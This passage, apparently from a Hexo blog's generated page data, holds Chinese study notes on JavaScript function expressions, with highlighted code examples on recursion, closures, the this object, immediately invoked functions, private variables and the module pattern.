class=\"title\">factorial</span>(<span class=\"params\">num</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (num &lt;= <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num * <span class=\"built_in\">arguments</span>.callee(num - <span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 严格模式下实现（访问arguments.callee有错误）</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> factorial = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">num</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (num &lt;= <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num * f(num - <span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"闭包\"><a href=\"#闭包\" class=\"headerlink\" title=\"闭包\"></a>闭包</h2><h3 id=\"1-匿名函数与闭包\"><a href=\"#1-匿名函数与闭包\" class=\"headerlink\" title=\"1. 匿名函数与闭包\"></a>1. 匿名函数与闭包</h3><ul>\n<li>闭包是指有权访问另一个函数作用域中的变量的函数。</li>\n<li>创建闭包的常见方式就是在一个函数内部创建另一个函数。</li>\n</ul>\n<h3 id=\"2-闭包与变量\"><a href=\"#2-闭包与变量\" class=\"headerlink\" title=\"2. 闭包与变量\"></a>2. 闭包与变量</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createFunctions</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> result = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">    result[i] = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-关于-this-对象\"><a href=\"#3-关于-this-对象\" class=\"headerlink\" title=\"3. 关于 this 对象\"></a>3. 关于 this 对象</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">\"The Window\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> object = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">\"My Object\"</span>,</span><br><span class=\"line\">  getNameFunc: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">alert(object.getNameFunc()()); <span class=\"comment\">//\"The Window\"（在非严格模式下）</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"模仿块级作用域\"><a href=\"#模仿块级作用域\" class=\"headerlink\" title=\"模仿块级作用域\"></a>模仿块级作用域</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//这里是块级作用域</span></span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<h2 id=\"私有变量\"><a href=\"#私有变量\" class=\"headerlink\" title=\"私有变量\"></a>私有变量</h2><h3 id=\"1-两种在对象上创建特权方法的方式\"><a href=\"#1-两种在对象上创建特权方法的方式\" class=\"headerlink\" title=\"1. 两种在对象上创建特权方法的方式\"></a>1. 两种在对象上创建特权方法的方式</h3><p>构造函数实现方式</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 构造函数实现方式</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">MyObject</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//私有变量和私有函数</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> privateVariable = <span class=\"number\">10</span>;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">privateFunction</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//特权方法</span></span><br><span class=\"line\">  <span class=\"keyword\">this</span>.publicMethod = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    privateVariable++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> privateFunction();</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 示例</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Person</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.getName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.setName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">    name = value;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> person = <span class=\"keyword\">new</span> Person(<span class=\"string\">\"Nicholas\"</span>);</span><br><span class=\"line\">alert(person.getName()); <span class=\"comment\">//\"Nicholas\"</span></span><br><span class=\"line\">person.setName(<span class=\"string\">\"Greg\"</span>);</span><br><span class=\"line\">alert(person.getName()); <span class=\"comment\">//\"Greg\"</span></span><br></pre></td></tr></table></figure>\n<p>静态私有变量实现方式</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 静态私有变量实现方式</span></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//私有变量和私有函数</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> privateVariable = <span class=\"number\">10</span>;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">privateFunction</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//构造函数</span></span><br><span class=\"line\">  MyObject = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;&#125;;</span><br><span class=\"line\">  <span class=\"comment\">//公有/特权方法</span></span><br><span class=\"line\">  MyObject.prototype.publicMethod = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    privateVariable++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> privateFunction();</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;)();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 示例</span></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">  Person = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">    name = value;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  Person.prototype.getName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  Person.prototype.setName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">    name = value;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;)();</span><br><span class=\"line\"><span class=\"keyword\">var</span> person1 = <span class=\"keyword\">new</span> Person(<span class=\"string\">\"Nicholas\"</span>);</span><br><span class=\"line\">alert(person1.getName()); <span class=\"comment\">//\"Nicholas\"</span></span><br><span class=\"line\">person1.setName(<span class=\"string\">\"Greg\"</span>);</span><br><span class=\"line\">alert(person1.getName()); <span class=\"comment\">//\"Greg\"</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> person2 = <span class=\"keyword\">new</span> Person(<span class=\"string\">\"Michael\"</span>);</span><br><span class=\"line\">alert(person1.getName()); <span class=\"comment\">//\"Michael\"</span></span><br><span class=\"line\">alert(person2.getName()); <span class=\"comment\">//\"Michael\"</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"单例模式（模块模式）\"><a href=\"#单例模式（模块模式）\" class=\"headerlink\" title=\"单例模式（模块模式）\"></a>单例模式（模块模式）</h2><p>普通方式<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> singleton = (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//私有变量和私有函数</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> privateVariable = <span class=\"number\">10</span>;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">privateFunction</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//特权/公有方法和属性</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> &#123;</span><br><span class=\"line\">    publicProperty: <span class=\"literal\">true</span>,</span><br><span class=\"line\">    publicMethod: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      privateVariable++;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> privateFunction();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure></p>\n<p>增强方式（适合那些单例必须是某种类型的实例）<br><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> singleton = (<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//私有变量和私有函数</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> privateVariable = <span class=\"number\">10</span>;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">privateFunction</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//创建对象</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> object = <span class=\"keyword\">new</span> CustomType();</span><br><span class=\"line\">  <span class=\"comment\">//添加特权/公有属性和方法</span></span><br><span class=\"line\">  object.publicProperty = <span class=\"literal\">true</span>;</span><br><span class=\"line\">  object.publicMethod = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    privateVariable++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> privateFunction();</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"comment\">//返回这个对象</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> object;</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>重读《JavaScript高级程序设计》，温故而知新。</p>\n<h1 id=\"概述\"><a href=\"#概述\" class=\"headerlink\" title=\"概述\"></a>概述</h1><p>函数表达式：递归，闭包，模仿块级作用域，私有变量。</p>","more":"<h1 id=\"详述\"><a href=\"#详述\" class=\"headerlink\" title=\"详述\"></a>详述</h1><h2 id=\"函数表达式与函数声明的区别\"><a href=\"#函数表达式与函数声明的区别\" class=\"headerlink\" title=\"函数表达式与函数声明的区别\"></a>函数表达式与函数声明的区别</h2><ul>\n<li>“函数声明提升”</li>\n<li>创建函数两种方式</li>\n</ul>\n<h2 id=\"递归\"><a href=\"#递归\" class=\"headerlink\" title=\"递归\"></a>递归</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">factorial</span>(<span class=\"params\">num</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (num &lt;= <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num * <span class=\"built_in\">arguments</span>.callee(num - <span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// 严格模式下实现（访问arguments.callee有错误）</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> factorial = <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f</span>(<span class=\"params\">num</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (num &lt;= <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num * f(num - <span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"闭包\"><a href=\"#闭包\" class=\"headerlink\" title=\"闭包\"></a>闭包</h2><h3 id=\"1-匿名函数与闭包\"><a href=\"#1-匿名函数与闭包\" class=\"headerlink\" title=\"1. 匿名函数与闭包\"></a>1. 匿名函数与闭包</h3><ul>\n<li>闭包是指有权访问另一个函数作用域中的变量的函数。</li>\n<li>创建闭包的常见方式就是在一个函数内部创建另一个函数。</li>\n</ul>\n<h3 id=\"2-闭包与变量\"><a href=\"#2-闭包与变量\" class=\"headerlink\" title=\"2. 闭包与变量\"></a>2. 闭包与变量</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">createFunctions</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> result = <span class=\"keyword\">new</span> <span class=\"built_in\">Array</span>();</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">10</span>; i++) &#123;</span><br><span class=\"line\">    result[i] = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"3-关于-this-对象\"><a href=\"#3-关于-this-对象\" class=\"headerlink\" title=\"3. 关于 this 对象\"></a>3. 关于 this 对象</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">\"The Window\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">var</span> object = &#123;</span><br><span class=\"line\">  name: <span class=\"string\">\"My Object\"</span>,</span><br><span class=\"line\">  getNameFunc: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.name;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">alert(object.getNameFunc()()); <span class=\"comment\">//\"The Window\"（在非严格模式下）</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"模仿块级作用域\"><a href=\"#模仿块级作用域\" class=\"headerlink\" title=\"模仿块级作用域\"></a>模仿块级作用域</h2><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//这里是块级作用域</span></span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<h2 id=\"私有变量\"><a href=\"#私有变量\" class=\"headerlink\" title=\"私有变量\"></a>私有变量</h2><h3 id=\"1-两种在对象上创建特权方法的方式\"><a href=\"#1-两种在对象上创建特权方法的方式\" class=\"headerlink\" title=\"1. 两种在对象上创建特权方法的方式\"></a>1. 两种在对象上创建特权方法的方式</h3><p>构造函数实现方式</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 构造函数实现方式</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">MyObject</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//私有变量和私有函数</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> privateVariable = <span class=\"number\">10</span>;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">privateFunction</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//特权方法</span></span><br><span class=\"line\">  <span class=\"keyword\">this</span>.publicMethod = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    privateVariable++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> privateFunction();</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 示例</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Person</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.getName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  <span class=\"keyword\">this</span>.setName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">    name = value;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> person = <span class=\"keyword\">new</span> Person(<span class=\"string\">\"Nicholas\"</span>);</span><br><span class=\"line\">alert(person.getName()); <span class=\"comment\">//\"Nicholas\"</span></span><br><span class=\"line\">person.setName(<span class=\"string\">\"Greg\"</span>);</span><br><span class=\"line\">alert(person.getName()); <span class=\"comment\">//\"Greg\"</span></span><br></pre></td></tr></table></figure>\n<p>静态私有变量实现方式</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 静态私有变量实现方式</span></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">//私有变量和私有函数</span></span><br><span class=\"line\">  <span class=\"keyword\">var</span> privateVariable = <span class=\"number\">10</span>;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">privateFunction</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">//构造函数</span></span><br><span class=\"line\">  MyObject = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;&#125;;</span><br><span class=\"line\">  <span class=\"comment\">//公有/特权方法</span></span><br><span class=\"line\">  MyObject.prototype.publicMethod = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    privateVariable++;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> privateFunction();</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;)();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 示例</span></span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> name = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">  Person = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">    name = value;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  Person.prototype.getName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> name;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  Person.prototype.setName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">    name = value;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;)();</span><br><span class=\"line\"><span class=\"keyword\">var</span> person1 = <span class=\"keyword\">new</span> 